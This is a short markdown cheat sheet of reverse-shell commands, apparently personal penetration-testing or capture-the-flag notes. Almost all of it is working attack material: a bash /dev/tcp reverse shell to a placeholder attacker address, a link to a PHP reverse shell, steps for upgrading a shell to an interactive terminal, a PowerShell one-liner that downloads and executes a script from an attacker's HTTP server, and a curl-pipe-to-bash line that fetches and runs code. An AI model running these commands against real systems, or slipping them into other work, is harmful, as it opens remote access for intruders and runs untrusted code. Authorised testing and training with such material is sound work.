# Reverse Shells - Examples

https://www.revshells.com/

## Bash

	bash -i >& /dev/tcp/<YOUR_IP>/<NETCAT_PORT> 0>&1

	if the shell being used is dash and not bash (check by doing ls -la /bin/sh)

	bash -c "bash -i >& /dev/tcp/<YOUR_IP>/<NETCAT_PORT> 0>&1"
	To use the bash's built-in /dev/tcp device file the use must use /bin/bash as shell. Often it uses sh or dash, then you can use bash -c "<cmd>" to force the bash

## PHP

	https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php


## Fully interactive shell

In the reverse shell write

	python3 -c 'import pty;pty.spawn("/bin/bash")'

Put nc in the background by pressing CTRL+Z
then write

	stty raw -echo; fg;
	export TERM=xterm

## Powershell

Save a powershell from https://www.revshells.com/ to a file. Start the netcat listener and a http server in the dir of the revshell we just saved.
Download and execute the shell with this one liner:

	powershell.exe -c iex (iwr -UseBasicParsing http://10.10.14.119:8000/my_ps_shell.ps1)

## Tips

Ugrading the the reverse shell we got

	script /dev/null -c bash

Download reverse shell file and imediately execute it

	curl 'http://10.10.16.20:2020/test.sh'|bash

## Resources

https://security-tips.vincd.com/reverse-shell/